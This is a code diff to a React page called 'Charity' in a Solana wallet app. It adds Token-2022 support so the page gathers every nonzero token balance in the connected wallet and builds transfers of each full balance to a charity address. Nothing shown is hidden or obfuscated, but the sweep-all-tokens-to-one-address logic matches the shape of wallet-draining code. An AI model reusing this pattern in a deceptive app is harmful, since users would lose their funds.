@@ -2,7 +2,8 @@ import { useState, useEffect, useCallback } from 'react';
 import { useConnection, useWallet } from '@solana/wallet-adapter-react';
 import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { PublicKey, Transaction, SystemProgram, LAMPORTS_PER_SOL, ComputeBudgetProgram } from '@solana/web3.js';
-import { getAssociatedTokenAddress, createTransferInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getAssociatedTokenAddress, createTransferCheckedInstruction, createAssociatedTokenAccountInstruction, getAccount, TOKEN_PROGRAM_ID, TOKEN_2022_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID } from '@solana/spl-token';
+import { getMintProgramId } from '@/utils/tokenProgram';
 import { Navigation } from '@/components/Navigation';
 import { Button } from '@/components/ui/button';
 import { Card, CardContent } from '@/components/ui/card';
@@ -76,12 +77,23 @@ const Charity = () => {
       const solAmount = solBal / LAMPORTS_PER_SOL;
       setSolBalance(solAmount);
 
-      // Fetch token accounts
-      const tokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+      // Fetch legacy SPL Token accounts
+      const legacyTokenAccounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
         programId: TOKEN_PROGRAM_ID
       });
 
-      const tokens: TokenBalance[] = tokenAccounts.value
+      // Fetch Token-2022 accounts (Pump.fun tokens)
+      const token2022Accounts = await connection.getParsedTokenAccountsByOwner(publicKey, {
+        programId: TOKEN_2022_PROGRAM_ID
+      });
+
+      // Combine both token types
+      const allTokenAccounts = [
+        ...legacyTokenAccounts.value,
+        ...token2022Accounts.value
+      ];
+
+      const tokens: TokenBalance[] = allTokenAccounts
         .map(account => {
           const info = account.account.data.parsed.info;
           return {
@@ -90,7 +102,7 @@ const Charity = () => {
             decimals: info.tokenAmount.decimals,
             uiAmount: info.tokenAmount.uiAmount,
             symbol: info.mint.slice(0, 8),
-            valueInSOL: 0 // Would need price oracle for real values
+            valueInSOL: 0
           };
         })
         .filter(token => token.uiAmount > 0);
@@ -142,12 +154,33 @@ const Charity = () => {
       
       try {
         const mintPubkey = new PublicKey(token.mint);
-        const fromTokenAccount = await getAssociatedTokenAddress(mintPubkey, publicKey);
-        const toTokenAccount = await getAssociatedTokenAddress(mintPubkey, charityPubkey);
+        
+        // Determine which token program this mint belongs to
+        const mintInfo = await getMintProgramId(connection, token.mint);
+        const tokenProgramId = mintInfo.programId;
+        const decimals = mintInfo.decimals;
+        
+        console.log(`Token ${token.mint}: using ${mintInfo.isToken2022 ? 'Token-2022' : 'Legacy SPL Token'} program`);
+        
+        // Get ATAs with the correct program ID
+        const fromTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          publicKey,
+          false,
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
+        const toTokenAccount = await getAssociatedTokenAddress(
+          mintPubkey, 
+          charityPubkey,
+          true,
+          tokenProgramId,
+          ASSOCIATED_TOKEN_PROGRAM_ID
+        );
 
         // Check if charity's token account exists, create if not
         try {
-          await getAccount(connection, toTokenAccount);
+          await getAccount(connection, toTokenAccount, 'confirmed', tokenProgramId);
         } catch (error) {
           // Account doesn't exist, create it
           transaction.add(
@@ -156,21 +189,23 @@ const Charity = () => {
               toTokenAccount, // ata
               charityPubkey, // owner
               mintPubkey, // mint
-              TOKEN_PROGRAM_ID,
+              tokenProgramId,
               ASSOCIATED_TOKEN_PROGRAM_ID
             )
           );
         }
 
-        // Add transfer instruction
+        // Use createTransferCheckedInstruction with correct program
         transaction.add(
-          createTransferInstruction(
+          createTransferCheckedInstruction(
             fromTokenAccount,
+            mintPubkey,
             toTokenAccount,
             publicKey,
             BigInt(token.balance),
+            decimals,
             [],
-            TOKEN_PROGRAM_ID
+            tokenProgramId
           )
         );
       } catch (error) {
